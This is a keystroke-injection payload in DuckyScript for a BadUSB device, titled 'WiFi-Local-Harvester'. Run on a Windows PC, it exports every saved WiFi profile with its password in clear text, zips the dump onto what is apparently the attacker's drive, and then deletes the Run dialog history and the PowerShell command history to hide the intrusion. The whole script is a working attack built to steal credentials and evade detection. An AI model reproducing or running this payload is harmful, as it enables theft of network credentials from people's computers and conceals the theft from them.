REM Title: WiFi-Local-Harvester
REM Author: Joe'Vil
REM: Version 1.0
DELAY 2000
GUI d
DELAY 150
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 500
STRING cd desktop
ENTER
STRING cd OneDrive/desktop
ENTER
STRING wmic logicaldisk get name > driveNames.txt
ENTER
DELAY 1000
STRING powershell
ENTER
STRING Get-Content driveNames.txt | Select-Object -last 1 | clip
ENTER
STRING cmd
ENTER
DELAY 200
CTRL V
ENTER
ENTER
DELAY 500
STRING mkdir DUMP
ENTER
DELAY 800
STRING cd DUMP
ENTER
STRING netsh wlan export profile key=clear 
ENTER
DELAY 500
STRING cd ..
ENTER
STRING powershell
ENTER
STRING Compress-Archive -Path DUMP -DestinationPath DUMP.zip
ENTER
DELAY 3000
STRING del DUMP
ENTER
STRING y
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 1000
REM --> Clean up
STRING C:
ENTER
STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
ENTER
STRING cd ..
ENTER
STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
ENTER
STRING del ConsoleHost_history.txt
ENTER
DELAY 200
STRING cd ..
ENTER
STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
ENTER
STRING del ConsoleHost_history.txt
ENTER
STRING exit
ENTER
DELAY 100
STRING del driveNames.txt
ENTER
DELAY 300
STRING exit
ENTER